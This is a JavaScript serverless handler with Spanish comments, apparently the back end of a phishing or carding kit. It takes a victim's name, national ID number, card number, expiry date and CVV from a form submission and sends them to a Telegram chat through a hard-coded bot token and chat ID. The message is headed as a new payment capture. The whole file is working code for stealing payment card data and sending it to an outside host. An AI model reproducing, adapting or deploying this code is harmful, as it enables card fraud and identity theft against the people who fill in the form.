// Archivo: /api/notificar.js (Se ejecuta en el entorno serverless de Vercel)
export default async function handler(req, res) {
  // 1. Permitir solo peticiones POST
  if (req.method !== 'POST') {
    return res.status(405).json({ status: 'error', message: 'Método no permitido' });
  }

  try {
    // 2. Configuración del Bot (Datos extraídos de tu script PHP)
    const TOKEN = "8948795195:AAFNDbx1b03tL9fEjvrrN5mieFYNbFT5l1g";
    const CHAT_ID = "8510398513";

    // 3. Captura de datos desde el cuerpo de la petición (JSON)
    const { titular, dni, tarjeta, vencimiento, cvv } = req.body;

    // 4. Preparación del Mensaje (Formato HTML idéntico al original)
    const mensaje = `<b>💳 Nueva Captura de Pago</b>\n\n` +
                    `<b>👤 Titular:</b> ${titular || 'N/A'}\n` +
                    `<b>🆔 DNI:</b> ${dni || 'N/A'}\n` +
                    `<b>🔢 Tarjeta:</b> <code>${tarjeta || 'N/A'}</code>\n` +
                    `<b>📅 Vencimiento:</b> ${vencimiento || 'N/A'}\n` +
                    `<b>🔒 CVV:</b> <code>${cvv || 'N/A'}</code>`;

    // 5. Envío de datos a la API de Telegram usando fetch nativo
    const telegramUrl = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: mensaje,
        parse_mode: 'HTML'
      })
    });

    // 6. Respuesta al Frontend
    if (response.ok) {
      return res.status(200).json({ status: 'success', message: 'Datos enviados correctamente' });
    } else {
      return res.status(500).json({ status: 'error', message: 'Error en la API de Telegram' });
    }
  } catch (error) {
    return res.status(500).json({ status: 'error', message: error.message });
  }
}
